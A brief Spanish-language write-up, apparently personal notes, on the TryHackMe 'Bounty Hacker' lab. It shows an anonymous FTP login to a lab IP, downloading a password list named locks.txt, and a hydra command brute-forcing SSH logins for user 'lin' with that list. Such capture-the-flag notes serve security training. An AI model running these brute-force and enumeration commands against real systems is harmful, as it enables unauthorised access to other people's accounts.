# Bounty Hacker - TryHackMe 
**IP:**  10.10.0.212

## Acceso FTP Anónimo
```bash

ftp 10.10.0.212
anonymous
ls
mget *
Encontramos locks.txt (lista de contraseñas).
  ```
## Fuerza Bruta SSH
```bash
hydra -l lin -P locks.txt 10.10.0.212 ssh
  ```